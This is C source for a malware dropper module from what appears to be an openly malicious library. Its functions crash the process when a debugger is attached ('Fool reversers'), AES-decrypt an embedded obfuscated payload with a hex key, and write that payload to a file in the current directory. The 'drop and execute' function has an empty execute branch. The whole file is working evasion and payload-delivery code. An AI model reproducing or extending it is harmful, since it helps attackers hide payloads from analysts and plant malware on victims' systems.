#include "xPayload.h"

#include <stdint.h>
#include <Windows.h>

#include "xLibMaliciousApi.h"
#include "xOsApi.h"



bool xPayloadDrop(const char* hexKey, const uint8_t* obfuscated, const size_t obfuscatedSize, const wchar_t* fileName)
{
	if (!hexKey || !obfuscated || !obfuscatedSize || !fileName)
	{
		return false;
	}

	bool result = false;

	// Fool reversers
	X_LIB_MALICIOUS_CALL(xCrashIfDebugger)();

	uint8_t* key = NULL;

	uint32_t keySize = 0;

	// Convert obfuscated key string to buffer
	if (X_LIB_MALICIOUS_CALL(xConversionHexStringToByte)(hexKey, &key, &keySize))
	{
		uint8_t* payload = NULL;

		uint32_t payloadSize = 0;

		// Deobfuscate payload
		if (X_LIB_MALICIOUS_CALL(xObfuscationDeobfuscateAes)(key, keySize, obfuscated, obfuscatedSize, &payload, &payloadSize, xObfuscationEntropyReduce))
		{
			wchar_t fileNameDrop[MAX_PATH + 1] = { 0 };

			DWORD length = X_KERNEL32_CALL(GetCurrentDirectory)(MAX_PATH + 1, fileNameDrop);

			if (length)
			{
				if (length + wcslen(fileName) + wcslen(L"\\") < MAX_PATH)
				{
					wcscat_s(fileNameDrop, L"\\");

					wcscat_s(fileNameDrop, fileName);

					HANDLE file = X_KERNEL32_CALL(CreateFile)(fileNameDrop, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

					if (file != INVALID_HANDLE_VALUE)
					{
						if (X_KERNEL32_CALL(WriteFile)(file, payload, payloadSize, NULL, NULL))
						{
							result = true;
						}

						X_KERNEL32_CALL(CloseHandle)(file);
					}
				}
			}

			X_LIB_MALICIOUS_CALL(xMemoryFree)(payload);
		}

		X_LIB_MALICIOUS_CALL(xMemoryFree)(key);
	}

	return result;
}

bool xPayloadDropAndExecute(const char* hexKey, const uint8_t* obfuscated, const size_t obfuscatedSize, const wchar_t* fileName)
{
	if (!hexKey || !obfuscated || !obfuscatedSize || !fileName)
	{
		return false;
	}

	bool result = xPayloadDrop(hexKey, obfuscated, obfuscatedSize, fileName);

	if (result)
	{

	}

	return result;
}

bool xPayloadGetPayload(const char* hexKey, const uint8_t* obfuscated, const size_t obfuscatedSize, uint8_t** payload, size_t* payloadSize)
{
	if (!payload || !payloadSize)
	{
		return false;
	}

	bool result = false;

	// Fool reversers
	X_LIB_MALICIOUS_CALL(xCrashIfDebugger)();

	uint8_t* key = NULL;

	uint32_t keySize = 0;

	// Convert obfuscated key string to buffer
	if (X_LIB_MALICIOUS_CALL(xConversionHexStringToByte)(hexKey, &key, &keySize))
	{
		uint8_t* out = NULL;

		uint32_t outSize = 0;

		// Deobfuscate payload
		if (X_LIB_MALICIOUS_CALL(xObfuscationDeobfuscateAes)(key, keySize, obfuscated, obfuscatedSize, &out, &outSize, xObfuscationEntropyReduce))
		{
			*payload = out;

			*payloadSize = outSize;

			result = true;
		}

		X_LIB_MALICIOUS_CALL(xMemoryFree)(key);
	}

	return result;
}
